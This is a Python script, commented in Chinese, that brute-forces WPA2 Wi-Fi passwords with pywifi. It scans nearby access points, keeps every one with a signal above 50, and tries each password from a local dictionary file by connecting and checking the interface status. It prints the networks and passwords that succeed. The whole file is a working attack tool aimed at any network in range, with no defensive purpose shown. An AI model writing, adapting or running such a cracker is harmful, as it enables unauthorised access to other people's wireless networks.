# coding:utf-8
import time
from access_points import get_scanner
from functools import reduce
import pywifi
from pywifi import const

#依赖第三方模块 access_points pywifi

class WIFICracker():

    def __init__(self, path):
        # 初始化
        self.wifiNames = [];  # wifi名称
        self.succList = [];
        self.dicts = [];        # 字典
        wifi = pywifi.PyWiFi()
        self.iface = wifi.interfaces()[0]  # wifi interfaces

        # 获取wifi 名称
        self.getWifiNames();

        # 解析破解字典 准备暴力破解
        with open(path, "r", errors="ignore") as fp :
            file_dicts = fp.readlines();
        self.dicts = list(set(file_dicts));
        self.dicts.sort(key=file_dicts.index) # 保护排序
        # print(self.wifiNames) # 查看目前wifi list
        # 确认网卡处于断开状态
        self.iface.disconnect()
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def getWifiNames(self):
        wifi_scanner = get_scanner()
        wifi_aps = wifi_scanner.get_access_points()
        # map-reduce  https://research.google.com/archive/mapreduce.html
        wifi_infos = map(self.parse_wifiInfo, wifi_aps)
        wifi_name = reduce(self.summary_wifiName, wifi_infos)
        # 字符串转list
        self.wifiNames = wifi_name.strip(' ').split(',')

    # 返回需要wifi信息
    def parse_wifiInfo(self, ap):
        # ssid=baby, bssid=b8:08:d7:65:30:28, quality=99, security=WPA2-Personal
        return (ap['quality'], ap['ssid'], ap['bssid']) # wifi名称 mac地址

    # 加工返回wifi信息为需要信息 仅仅需要信号大于50的WIFI
    def summary_wifiName(self, a1, a2):
        if (type(a1) == tuple):
            if a1[0] > 50 :
                a1 = a1[1]
            else :
                a1 = ''
        if (type(a2) == tuple):
            if a2[0] > 50 :
                a2 = a2[1]
            else :
                a2 = ''
        if a1 == '':
            return str(a2) ;
        elif a2 == '':
            return str(a1) ;
        else :
            return str(a1) + ',' + str(a2)

    def CrackPassWord(self):
        for wifiName in self.wifiNames:
            print("开始破解：{0}".format(wifiName))
            for passwd in self.dicts :
                try:
                    passwd = passwd.strip('\n') ;
                    wifiName =  wifiName.strip('\n') ;
                    if self.try_connect(passwd, wifiName) :
                        print("{0} 破解成功. ".format(passwd))
                        self.succList.append('WIFI:{0}, 密码:{1}. '.format(wifiName, passwd))
                        break
                    else :
                        print("{0} 破解失败. ".format(passwd.strip('\n')))
                except:
                    continue

    def try_connect(self, findStr, WIFIName):#测试链接
        profile = pywifi.Profile()  #创建wifi链接文件
        profile.ssid = WIFIName #wifi名称
        profile.auth = const.AUTH_ALG_OPEN  #网卡的开放，
        profile.akm.append(const.AKM_TYPE_WPA2PSK)#wifi加密算法
        profile.cipher = const.CIPHER_TYPE_CCMP    #加密单元
        profile.key = findStr #密码
        self.iface.remove_all_network_profiles() #删除所有的wifi文件
        network_profile = self.iface.add_network_profile(profile)#设定新的链接文件
        self.iface.connect(network_profile)
        #print(self.iface.status())  # 0 初始化
        time.sleep(2);  # 根据自己电脑修改  连接wifi时间
        #print(self.iface.status())  # 3 失败  4 成功
        if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
            retCode=True
            self.iface.disconnect()
        else:
            retCode=False

        # 返回破解状态
        return retCode

    def printResult(self):
        for item in self.succList:
            print(item)

    def __del__(self):
        pass


dict_path = "C:\Software\Dicts\simple.txt"
# 获取wifi密码
cracker = WIFICracker(dict_path)
cracker.CrackPassWord()
cracker.printResult()